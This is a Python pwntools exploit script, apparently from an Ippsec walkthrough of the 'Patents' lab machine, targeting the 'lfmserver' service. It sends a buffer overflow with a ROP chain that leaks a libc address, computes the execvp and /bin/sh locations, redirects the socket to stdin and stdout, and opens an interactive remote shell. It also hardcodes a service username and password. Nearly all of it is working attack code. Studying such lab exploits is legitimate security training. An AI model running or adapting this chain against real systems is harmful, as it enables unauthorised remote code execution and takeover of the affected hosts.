#
# Ippsec Exploit for lfmserver on Patents
#
# https://youtu.be/XqsURG_agvY
#
#

from pwn import *
import urllib.parse

# Search with ropper --search "pop r??" --file lfmserver
# 0x0000000000405c4b pop rdi; ret;
# 0x0000000000405c49: pop rsi; pop r15; ret;

RHOST = "10.10.10.173"
# RHOST = "127.0.0.1"
RPORT = 8888

pop_rdi     = p64(0x405c4b)
pop_rsi_r15 = p64(0x405c49)

lfmserver_elf = ELF("lfmserver", checksec=False)

#  /lib/x86_64-linux-gnu/libc.so.6
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
libc = ELF("./libc6_2.28-0ubuntu1_amd64.so", checksec = False)

write  = p64(lfmserver_elf.plt['write'])
socket = p64(lfmserver_elf.got['socket'])

execvp_libc = libc.symbols['execvp']
socket_libc = libc.symbols['socket']

# Gadget: write(6, socket)

leak_socket = pop_rdi + p64(0x6)
leak_socket += pop_rsi_r15 + socket + p64(0)
leak_socket += write

junk = ("A" * 148)

def build_request(gadget):
    enc_gadget = urllib.parse.quote(gadget, safe='').encode()    
    req  = f"CHECK /convert.php%00{junk + enc_gadget.decode()} LFM\r\n"
    req += "User=lfmserver_user\r\n"
    req += "Password=!gby0l0r0ck$$!\r\n"
    req += "\r\n"
    req += "b56a569c6162f6f04ea71e581beadf68\n"
    # req += "d41d8cd98f00b204e9800998ecf8427e\n"
    return req

# Stage 1 = leak socket
req = build_request(leak_socket)

r = remote(RHOST,8888)
r.send(req)
r.recvlines(4)
r.recv(1)
socket_leak = u64(r.recv(8))
log.success(f"leaked socket@libc {hex(socket_leak)}")
r.close()

# Stage 2a = Calculate memory offsets

rebase = socket_libc - execvp_libc
execvp_leak = socket_leak - rebase

log.info(f"execvp@libc leak {hex(execvp_leak)}")


# Stage 2b - Make Gadget
# Gadget dup2(6. STDIN) # STDIN = 0

binsh_libc = list(libc.search("/bin/sh\x00".encode()))[0]

rebase     = socket_libc - binsh_libc
binsh_leak = socket_leak - rebase

log.info(f"binsh@libc leak {hex(binsh_leak)}")

dup2 = p64(lfmserver_elf.plt['dup2'])
dup_stdin  = pop_rdi + p64(0x6)
dup_stdin += pop_rsi_r15 + p64(0x0) + p64(0x0)
dup_stdin += dup2

dup_stdout = pop_rdi + p64(0x6)
dup_stdout += pop_rsi_r15 + p64(0x1) + p64(0x0)
dup_stdout += dup2

exec_bash = pop_rdi + p64(binsh_leak)
exec_bash += pop_rsi_r15 + p64(0x0) + p64(0x0)
exec_bash += p64(execvp_leak)

req = build_request(dup_stdin + dup_stdout + exec_bash)
r = remote(RHOST, RPORT)
r.send(req)
r.interactive()
r.close()





